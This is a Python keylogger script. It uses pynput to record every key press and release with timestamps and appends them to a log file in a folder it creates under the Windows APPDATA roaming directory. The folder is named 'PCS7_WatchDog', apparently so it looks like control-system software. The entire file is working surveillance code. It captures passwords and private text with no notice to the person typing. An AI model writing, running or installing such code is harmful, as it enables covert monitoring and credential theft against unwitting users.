from pynput import keyboard 
from datetime import datetime
import os
appdata_path = os.environ['APPDATA']
roamingfolderpath = os.path.join(appdata_path, 'PCS7_WatchDog') #get the roaming folder path and create keylogger folder
os.makedirs(roamingfolderpath, exist_ok=True) #create storage folder
#_12h = now.strftime("%m/%d/%Y %I:%M:%S %p") change time to 12h format 

def on_press(key):
    try:
        now = datetime.now()   #add date
        # print('alphanumeric key {0} pressed'.format(
            # key.char)+"   "+now.strftime("%m/%d/%Y %I:%M:%S %p"))
        with open(roamingfolderpath + r"\log.log", "a") as file:
            file.write(' {0}     '.format(
            key.char)+"   "+now.strftime("%m/%d/%Y %I:%M:%S %p")+"\n")
        del now
    except AttributeError:
        now = datetime.now()
        with open(roamingfolderpath + r"\log.log", "a") as file:
            file.write('Special key {0}     '.format(
            key)+"   "+now.strftime("%m/%d/%Y %I:%M:%S %p")+"\n")
        del now
        # print('special key {0} pressed'.format(
            # key)+"   "+now.strftime("%m/%d/%Y %I:%M:%S %p"))

def on_release(key):
    now = datetime.now()   #add date
    with open(roamingfolderpath + r"\log.log", "a") as file:
            file.write('some key {0} released  '.format(
            key)+"   "+now.strftime("%m/%d/%Y %I:%M:%S %p")+"\n")
    del now
    # print('{0} released'.format(
        # key)+"   "+now.strftime("%m/%d/%Y %I:%M:%S %p"))


# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()